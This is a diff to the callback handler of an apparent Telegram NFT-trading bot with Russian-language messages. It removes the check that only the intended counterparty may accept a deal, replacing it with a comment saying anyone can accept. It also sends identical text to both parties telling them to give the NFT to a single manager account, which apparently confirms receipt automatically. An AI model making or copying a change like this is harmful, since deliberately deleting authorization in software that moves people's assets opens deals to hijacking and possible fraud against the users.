@@ -441,9 +441,7 @@ def handle_callback(callback):
             if user_id == deal['creator_id']:
                 edit_message(chat_id, message_id, "<b>Нельзя принять свою сделку!</b>")
                 return
-            if username.lower() != deal['second_user'].lower():
-                edit_message(chat_id, message_id, "<b>Эта сделка создана не для вас!</b>")
-                return
+            # Любой может принять сделку
 
             deal['participant_id'] = user_id
             deal['participant_name'] = username
@@ -452,10 +450,13 @@ def handle_callback(callback):
             top_deals.append({'user1': mask_username(deal['creator_name']), 'user2': mask_username(username), 'amount': deal['amount']})
             top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
 
-            send_message(deal['creator_id'],
-                f"<b>Участник принял вашу сделку!</b>\n\nПередайте NFT менеджеру @GiftExchangersManager.")
-            edit_message(chat_id, message_id,
-                f"<b>Вы приняли сделку #{deal_id}</b>\n\nОжидайте — создатель передаст NFT менеджеру @GiftExchangersManager.")
+            notify_text = (
+                "<b>Участник принял вашу сделку!</b>\n\n"
+                "Передайте NFT менеджеру @GiftExchangersManager\n"
+                "После этого он автоматически подтвердит получение NFT и вы сможете продолжить сделку."
+            )
+            send_message(deal['creator_id'], notify_text)
+            edit_message(chat_id, message_id, notify_text)
             return
 
         if data.startswith('cancel_'):
